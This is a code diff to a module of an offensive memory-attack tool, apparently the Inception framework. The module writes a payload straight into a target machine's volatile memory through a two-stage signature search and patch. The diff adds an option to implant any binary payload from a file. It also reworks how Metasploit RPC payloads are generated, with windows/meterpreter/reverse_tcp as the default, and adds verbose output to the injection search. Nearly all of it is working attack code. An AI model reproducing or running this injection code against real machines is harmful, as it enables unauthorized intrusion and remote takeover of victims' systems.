@@ -34,7 +34,8 @@ IS_INTRUSIVE = True
 term = terminal.Terminal()
 
 info = 'This module implants a (potentially memory-only) Metasploit ' \
-       'payload directly to the volatile memory of the target machine.'
+       'payload directly to the volatile memory of the target machine.' \
+       'You can also implant any other binary payload from file.'
 
 # TODO
 # class InfectSignature(collections.namedtuple('InfectSignature',
@@ -190,6 +191,9 @@ def add_options(group):
     group.add_option('--msfpw',
                      dest='msfpw',
                      help='password for the MSFRPC daemon')
+    group.add_option('--payload',
+                     dest='payload_fn',
+                     help='implant binary payload from file')
 
 
 def str2dict(str):
@@ -227,34 +231,40 @@ def run(opts, memspace):
               'wad of cash in unmarked dollar bills or a pull request on '
               'github.')
 
-    # Connect to msf and generate shellcode
-    try:
-        client = MsfRpcClient(opts.msfpw)
-    except MsfRpcError as e:
-        raise InceptionException('Could not connect to Metasploit: {0}'
-                                 .format(e))
+    if opts.payload_fn:
+        try:
+            payload = open(opts.payload_fn, 'rb').read()
+        except Exception as e:
+            raise InceptionException(e)
+    else:
+        # Connect to msf and generate shellcode
+        try:
+            client = MsfRpcClient(opts.msfpw)
+        except MsfRpcError as e:
+            raise InceptionException('Could not connect to Metasploit: {0}'
+                                     .format(e))
 
-    name = term.poll('What MSF payload do you want to use?',
-                     default='windows/meterpreter/reverse_tcp')
-    try:
-        module = PayloadModule(client, name)
-        set_opts(module, ','.join(filter(None,
-                                         (opts.msfopts, 'EXITFUNC=thread'))))
-        payload = module.execute(Encoder='generic/none').get('payload')
-    except (MsfRpcError, TypeError) as e:
-        raise InceptionException('Could not generate Metasploit payload: {0}'
-                                 .format(e))
+        name = term.poll('What MSF payload do you want to use?',
+                         default='windows/meterpreter/reverse_tcp')
+        try:
+            module = PayloadModule(client, name)
+            set_opts(module, ','.join(filter(None, (opts.msfopts,
+                                                    'EXITFUNC=thread'))))
+            payload = module.execute(Encoder='generic/none').get('payload')
+        except (MsfRpcError, TypeError) as e:
+            raise InceptionException('Could not generate Metasploit payload: '
+                                     '{0}'.format(e))
 
-    needed = [x for x in module.required if x not in module.advanced]
-    term.info('Selected options:')
-    for o in needed:
-        term.info('{0}: {1}'.format(o, module[o]))
+        needed = [x for x in module.required if x not in module.advanced]
+        term.info('Selected options:')
+        for o in needed:
+            term.info('{0}: {1}'.format(o, module[o]))
 
     # TODO: Allow users to set required options
 
     # --- STAGE 1 ---
     term.info('Stage 1: Searcing for injection point')
-    address, signature, offset = memspace.find(stage1)
+    address, signature, offset = memspace.find(stage1, verbose=opts.verbose)
     
     # Signature found, let's patch
     term.found_at(address, memspace.page_no(address))
@@ -282,13 +292,13 @@ def run(opts, memspace):
     term.info('Restoring memory at initial injection point')
     memspace.write(address, backup)
     # Search for the newly allocated page with our signature
-    term.info('Stage 2: Searching for page in stage 1')
-    address, signature, offset = memspace.rawfind(0, 0xffe0000000000000)
+    term.info('Stage 2: Searching for page allocated in stage 1')
+    address, signature, offset = memspace.rawfind(0,  # Offset
+                                                  0xffe0000000000000,  # Sig
+                                                  verbose=opts.verbose)
     # Signature found, let's patch
     term.found_at(address, memspace.page_no(address))
     term.info('Patching at {0:#x}'.format(address))
     memspace.write(address, payload)
 
     term.info('Patch verified; successful')
-    term.info('BRRRRRRRAAAAAWWWWRWRRRMRMRMMRMRMMMMM!!!')
-    pass
